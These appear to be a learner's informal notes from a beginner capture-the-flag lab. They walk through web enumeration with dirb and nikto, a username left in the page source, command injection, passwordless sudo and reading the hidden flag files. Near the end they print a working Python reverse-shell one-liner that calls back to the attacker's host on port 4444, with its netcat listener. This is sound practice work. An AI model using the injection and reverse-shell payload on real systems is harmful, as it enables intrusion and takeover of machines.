Unsure is this is important or not. 

|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)

Important because this may be a clue to the fuirst tag. Also the Apache version is good for further enumeration or exploitation. 
Moving on to what the website offers, we have…not much other than some text and a file photo. Nothing is provided in the page source information either. 
Just from memory or the school we would further look at what the site offers by running a directory finder or enemurator. In looking at tools that provide suchj a thing, we can usedirbuster and run it against a known dir list. 

Running dirb http://10.10.214.232 
Side note ,usure on why http has to be inputted. Ran it the first time like nmap a n error returned. 
START_TIME: Tue Jan  2 11:50:33 2024
URL_BASE: http://10.10.214.232/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
Common.txt is running by default, interesting to note that we can create or add out own list if needed.
While dir is running, looked at the page source again and found 
<!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

May be needed to for the ssh login possibly. 
Interesting to note that there is a place where the dev can place dir that they want hidden in the robots.txt. 
Page hangs for some reason, found the issue wrong ip.

Opened all of them and they did not help. Only opened the home page, a long list of text and some gifs. 
Dirb is still running. 
Checkpoint.
We have \\
Wubbalubbadubdub
    Username: R1ckRul3s
\\
Dirb has now found and index.html which brings me to the same home page. Kind of stuck here until dirb comes up with more directories to test. Going to run a scanner called nikto in the mean time to check where the dirb does not.

Sup3rS3cretPickl3Ingred.txt

Found the first tag with the http://10.10.214.232/Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair

Interesting to note down the list is the denied.php
Nothing there

Something to note is the clue.txt
http://10.10.214.232/clue.txt

Look around the file system for the other ingredient.

We may be looking at the system directory when trying running LS.

There may be hidden files that are only assessable if root or super admin. The machine may be verlnerable to injection because LS can be run or we can even setup a reverse shell to communicate more effectively with the machine. 

Going to go the easier route for now. 
Need to figure out what we can run and how much is locked down and is capable. 
Bad: cd, less
Good: ls and pwd
Pwd: /var/www/html

Ls -al reveals the access to the directory.

/home/rick

Found the second part in the directory 

Interesting to note that because I could not simply use 
cd /home/rick/"second ingredients"; ls -al; pwd
only because this second ingredients seems like a word doc and it doesn’t help us if we can print the word doc. 
Has to use research and find a command that could view the contects of the second ingredients file. 
That command is less. The entirety of the command was less /home/rick/"second ingredients" because we are specifying the directory and “lessing” the second ingredients txt file.


Second part 
1 jerry tear

Now with the second part,m needed to check what provielages we currently have with sudo -l
We see Matching Defaults entries for www-data on ip-10-10-214-232.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-214-232.eu-west-1.compute.internal:
(ALL) NOPASSWD: ALL

It seems we can excute any command with privleage.

We can run sudo without anything stopping us or a password.

Running sudo ls /home 
Returns Rick and Ubuntu which again, doesn return anything.
Trying to navigate the machine more.

sudo ls /
returns 

bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz

possible good stuff
root: 3rd.txt
dev a list of nonsense
lost+found a list of nonsense

again with the less command, which looks like 
sudo less /root/3rd.txt because again, we are trying to view the contents of the txt through the command line. 
The last flag is fleep juice







Insteresting to note

Going to try the room again with the cyber mentors, way of finishing the room with netcat and python exploits.

Needed to find that python3 was used with which python3.returned /usr/bin/python3 meaning that we may be able to run python code to setup a reverse shell through the machine. The payload was found here 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python


python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.98.64",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
nc -nlvp on the port 4444

success the page hangs and the connection is good 

listening on [any] 4444 ...
connect to [10.2.98.64] from (UNKNOWN) [10.10.214.232] 48098
  in navigating the host and because there is no privilege, we can navigate unrestrained on the box.

Did some digging with ls and cd and found the root folder and found the third answer. Much easier when you are using a reverse shell.
